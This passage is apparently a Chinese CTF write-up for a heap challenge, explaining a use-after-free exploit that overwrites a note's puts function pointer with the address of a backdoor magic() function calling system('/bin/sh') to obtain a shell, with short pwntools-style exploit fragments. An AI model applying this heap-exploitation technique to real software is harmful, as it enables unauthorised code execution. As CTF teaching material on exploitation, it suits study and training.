## `magic`函数

程序还给了一个后门函数，只要我们能够成功调用这个函数就行了。

```
|  |  |

| --- | --- |

| 1  2  3  4 | `int` `magic()`  `{`  `return` `system(``"/bin/sh"``);`  `}` |
```

## 利用思路

利用`UAF`将`chunk1`的前`0x4`个字节存放的`puts`函数的地址修改为`magic`函数的地址，使得在执行`print_note`功能时，却是调用`magic`函数。

```
|  |  |

| --- | --- |

| 1  2  3 | `add(`0x8``,b``'aaa'``)`  `add(`0x8``,b``'aaa'``)`  `add(`0x18``,b``'aaa'``)` |
```

我们可以先调用三个`add_note`，设置`chunk1`的`size`分别为`0x8`，`0x8`，`0x16`

```
|  |  |

| --- | --- |

| 1  2 | `delete(`1``)`  `delete(`2``)` |
```

之后`free`第1和第2个`note`，我用`notelist`[下标].`chunk0`|1来表示每个`chunk`，此时`fastbin`中数据部分只有`0x8`大小的链表是`fastbin` -> `notelist[2].chunk0` -> `notelist[1].chunk0` -> `notelist[1].chunk1`

数据部分`0x16`大小的`fastbin` -> `notelist[2].chunk1`

```
|  |  |

| --- | --- |

| 1  2  3 | `payload` `=` `p32(magic)`  `add(`0x8``,payload)`  `print``(``1``)` |
```

再接着调用`add_note`就可以使得分配得到的`notelist[3].chunk1`和`notelist[1].chunk0`是一致的，因此我们也就能修改`notelist[1].chunk0`，也就将`puts_addr`改成`magic`的地址，接着执行`print_note`函数，最终执行`magic`函数，拿到`shell`。
